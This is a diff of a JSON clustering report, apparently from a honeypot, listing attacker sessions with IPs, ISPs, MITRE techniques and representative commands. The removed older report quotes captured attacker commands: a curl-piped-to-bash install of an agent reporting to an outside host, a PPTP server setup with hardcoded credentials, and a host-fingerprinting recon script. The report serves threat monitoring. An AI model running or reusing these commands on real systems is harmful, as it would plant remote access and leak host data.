@@ -1,25 +1,11 @@
 {
-  "generated_at": "2026-06-15T22:22:37.852641+00:00",
-  "total_sessions_with_commands": 13,
-  "total_clusters": 8,
-  "campaign_clusters": 1,
-  "singleton_clusters": 5,
-  "highest_severity": "MEDIUM",
-  "active_campaigns": [
-    {
-      "cluster_id": "CLU-003",
-      "name": "Recon Loader Script",
-      "severity": "MEDIUM",
-      "session_count": 3,
-      "unique_ip_count": 1,
-      "ttps": [
-        "T1082",
-        "T1592",
-        "T1078",
-        "T1083"
-      ]
-    }
-  ],
+  "generated_at": "2026-06-16T04:47:51.134961+00:00",
+  "total_sessions_with_commands": 5,
+  "total_clusters": 3,
+  "campaign_clusters": 0,
+  "singleton_clusters": 1,
+  "highest_severity": "NONE",
+  "active_campaigns": [],
   "clusters": [
     {
       "cluster_id": "CLU-001",
@@ -28,43 +14,26 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 2,
+      "session_count": 1,
       "unique_ips": [
-        "165.1.75.106"
+        "45.156.128.76"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "d2af147dd3fa2817",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        }
-      ],
+      "sequence_hash": "d4f04b78376da2d7",
+      "ttps": [],
       "representative_commands": [
-        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-        "apt-get update -y",
-        "apt-get install -y python3",
-        "python3 /tmp/bendi.py",
-        "rm /tmp/bendi.py",
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
+        "User-Agent: Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36",
+        "Accept: */*",
+        "Accept-Encoding: gzip"
       ],
       "members": [
         {
-          "session_id": "IR-bc7b87ebf869",
-          "src_ip": "165.1.75.106",
-          "country": "US",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-06-15T18:35:18.669091Z"
-        },
-        {
-          "session_id": "IR-2e82414852e9",
-          "src_ip": "165.1.75.106",
-          "country": "US",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-06-15T18:37:39.838652Z"
+          "session_id": "IR-163a192cebc1",
+          "src_ip": "45.156.128.76",
+          "country": "NL",
+          "isp": "INAP-AMS-1",
+          "command_count": 3,
+          "timestamp": "2026-06-16T02:41:32.486981Z"
         }
       ]
     },
@@ -75,278 +44,71 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 1,
+      "session_count": 2,
       "unique_ips": [
-        "185.125.201.79"
+        "34.62.188.152",
+        "35.187.170.92"
       ],
-      "unique_ip_count": 1,
-      "sequence_hash": "d37018aa60244e71",
+      "unique_ip_count": 2,
+      "sequence_hash": "6c2b02475f4c7e7e",
       "ttps": [],
       "representative_commands": [
-        "(apt-get update -qq && apt-get install -y -qq pptpd ppp 2>/dev/null || apt install -y -qq pptpd ppp 2>/dev/null || yum install -y pptpd 2>/dev/null) && mkdir -p /etc/ppp && echo option /etc/ppp/options.pptpd > /etc/pptpd.conf && echo localip 10.99.0.1 >> /etc/pptpd.conf && echo remoteip 10.99.0.200-10.99.0.250 >> /etc/pptpd.conf && echo root1234 pptpd toor1234 * > /etc/ppp/chap-secrets && echo name pptpd",
-        "apt-get update -qq",
-        "apt-get install -y -qq pptpd ppp 2 > /dev/null",
-        "apt install -y -qq pptpd ppp 2 > /dev/null",
-        "yum install -y pptpd 2 > /dev/null"
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+        "Accept-Encoding: gzip"
       ],
       "members": [
         {
-          "session_id": "IR-e02a7acc0b8e",
-          "src_ip": "185.125.201.79",
-          "country": "NL",
-          "isp": "lease for Timeweb",
-          "command_count": 5,
-          "timestamp": "2026-06-15T19:12:15.030750Z"
+          "session_id": "IR-fa2456631127",
+          "src_ip": "35.187.170.92",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-06-16T02:20:39.819894Z"
+        },
+        {
+          "session_id": "IR-b9f64a7a1c5f",
+          "src_ip": "34.62.188.152",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-06-16T02:38:19.590675Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-003",
-      "is_campaign": true,
-      "campaign_name": "Recon Loader Script",
-      "campaign_severity": "MEDIUM",
-      "campaign_description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
-      "matched_campaigns": [
-        {
-          "name": "Recon Loader Script",
-          "ttps": [
-            "T1078",
-            "T1083",
-            "T1592",
-            "T1082"
-          ],
-          "severity": "MEDIUM",
-          "description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
-          "pattern_hits": 6,
-          "pattern_total": 6
-        }
-      ],
-      "session_count": 3,
-      "unique_ips": [
-        "91.92.40.13"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "631b54e3d9c41137",
-      "ttps": [
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
-        },
-        {
-          "id": "T1078",
-          "name": "T1078"
-        },
-        {
-          "id": "T1083",
-          "name": "T1083"
-        }
-      ],
-      "representative_commands": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ;",
-        "uname -s -v -n -m 2 > /dev/null",
-        "uname -m 2 > /dev/null",
-        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
-      ],
-      "members": [
-        {
-          "session_id": "IR-04766094d689",
-          "src_ip": "91.92.40.13",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 4,
-          "timestamp": "2026-06-15T16:56:37.685683Z"
-        },
-        {
-          "session_id": "IR-c42c3b877fd4",
-          "src_ip": "91.92.40.13",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 4,
-          "timestamp": "2026-06-15T16:59:04.283643Z"
-        },
-        {
-          "session_id": "IR-35346eeb0238",
-          "src_ip": "91.92.40.13",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 4,
-          "timestamp": "2026-06-15T17:00:43.634690Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-004",
       "is_campaign": false,
       "campaign_name": null,
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 1,
+      "session_count": 2,
       "unique_ips": [
-        "165.154.29.169"
+        "34.62.188.152",
+        "35.187.170.92"
       ],
-      "unique_ip_count": 1,
-      "sequence_hash": "d391e788f7f56d56",
+      "unique_ip_count": 2,
+      "sequence_hash": "758d61f26a444483",
       "ttps": [],
       "representative_commands": [
-        "USER test",
-        "USER test",
-        "USER test",
-        "USER test"
+        "PING"
       ],
       "members": [
         {
-          "session_id": "IR-c679e2c4d763",
-          "src_ip": "165.154.29.169",
-          "country": "SG",
-          "isp": "UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
-          "command_count": 4,
-          "timestamp": "2026-06-15T19:33:59.726202Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-005",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "162.216.149.184"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "49efc5eb7bb5604b",
-      "ttps": [
-        {
-          "id": "T1083",
-          "name": "File & Directory Discovery"
-        }
-      ],
-      "representative_commands": [
-        "User-Agent: Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",
-        "Accept-Encoding: gzip"
-      ],
-      "members": [
-        {
-          "session_id": "IR-a3f358c43194",
-          "src_ip": "162.216.149.184",
-          "country": "US",
+          "session_id": "IR-11f5ca17e3d8",
+          "src_ip": "35.187.170.92",
+          "country": "BE",
           "isp": "Google LLC",
-          "command_count": 2,
-          "timestamp": "2026-06-15T18:08:52.735772Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-006",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "185.125.201.79"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "c812633aaf3b9318",
-      "ttps": [],
-      "representative_commands": [
-        "id 2>/dev/null; echo SSH_OK"
-      ],
-      "members": [
-        {
-          "session_id": "IR-954678c1263c",
-          "src_ip": "185.125.201.79",
-          "country": "NL",
-          "isp": "lease for Timeweb",
           "command_count": 1,
-          "timestamp": "2026-06-15T19:12:13.288583Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-007",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 3,
-      "unique_ips": [
-        "182.43.71.198",
-        "58.51.132.251",
-        "10.0.0.73"
-      ],
-      "unique_ip_count": 3,
-      "sequence_hash": "6fa4c8ac58e7a1d9",
-      "ttps": [
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        }
-      ],
-      "representative_commands": [
-        "uname -s -m"
-      ],
-      "members": [
-        {
-          "session_id": "IR-c963085d2caf",
-          "src_ip": "58.51.132.251",
-          "country": "CN",
-          "isp": "CHINANET Hubei province network",
-          "command_count": 1,
-          "timestamp": "2026-06-15T19:25:09.822660Z"
+          "timestamp": "2026-06-16T02:20:48.205983Z"
         },
         {
-          "session_id": "IR-8ef34aa53031",
-          "src_ip": "182.43.71.198",
-          "country": "CN",
-          "isp": "CHINANET SHANDONG PROVINCE NETWORK",
+          "session_id": "IR-bf0e03073c73",
+          "src_ip": "34.62.188.152",
+          "country": "BE",
+          "isp": "Google LLC",
           "command_count": 1,
-          "timestamp": "2026-06-15T19:34:54.053780Z"
-        },
-        {
-          "session_id": "IR-e847d87ded24",
-          "src_ip": "10.0.0.73",
-          "country": "",
-          "isp": "",
-          "command_count": 1,
-          "timestamp": "2026-06-15T20:01:41.088984Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-008",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "165.154.29.169"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "f2ea8fa9c5609908",
-      "ttps": [],
-      "representative_commands": [
-        "Connection:Close"
-      ],
-      "members": [
-        {
-          "session_id": "IR-7fbee846275b",
-          "src_ip": "165.154.29.169",
-          "country": "SG",
-          "isp": "UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
-          "command_count": 1,
-          "timestamp": "2026-06-15T19:33:48.045913Z"
+          "timestamp": "2026-06-16T02:38:33.021496Z"
         }
       ]
     }
